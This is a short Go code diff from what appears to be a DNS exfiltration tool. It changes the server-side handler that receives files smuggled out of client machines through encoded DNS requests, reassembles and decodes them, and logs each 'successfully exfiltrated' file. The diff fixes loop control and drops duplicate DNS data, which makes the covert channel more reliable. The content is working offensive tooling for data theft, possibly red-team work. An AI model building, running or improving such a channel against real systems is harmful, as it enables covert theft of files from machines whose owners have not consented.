@@ -96,7 +96,7 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 			filename, err := getFilePathFromEncodedFilename(clientDir, data)
 			if err != nil {
 				log.Println(err)
-				continue
+				break
 			}
 			file := fileutils.CreateFileIfNotExists(filename)
 			ex.openFiles[machineId][filename] = file
@@ -104,29 +104,35 @@ func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer s
 			filename, err := getFilePathFromEncodedFilename(clientDir, data)
 			if err != nil {
 				log.Println(err)
-				continue
+				break
 			}
 			file := ex.openFiles[machineId][filename]
 			if file == nil {
 				log.Println("Received a DNS_FILE_END message without a corresponding DNS_FILE_START message for file:", filename)
-				continue
+				break
 			}
 			decodedData, err := decodeFromModifiedBase64(string(ex.unprocessedData[machineId]))
 			if err != nil {
 				log.Println("Unable to decode data for file:", filename)
-				continue
+				break
 			}
 			_, err = file.Write(decodedData)
 			if err != nil {
 				log.Println(err)
+				break
 			}
 			err = file.Close()
 			if err != nil {
 				log.Println(err)
+				break
 			}
 			ex.unprocessedData[machineId] = make([]byte, 0)
 			log.Println("Successfully exfiltrated file:", filename)
 		case DNS_FILE_DATA.String():
+			// In case DNS requests get sent multiple times.
+			if strings.Contains(string(ex.unprocessedData[machineId]), data) {
+				break
+			}
 			ex.unprocessedData[machineId] = append(ex.unprocessedData[machineId], data...)
 		default:
 			log.Printf("Unknown message type: '%s'\n", msgType)
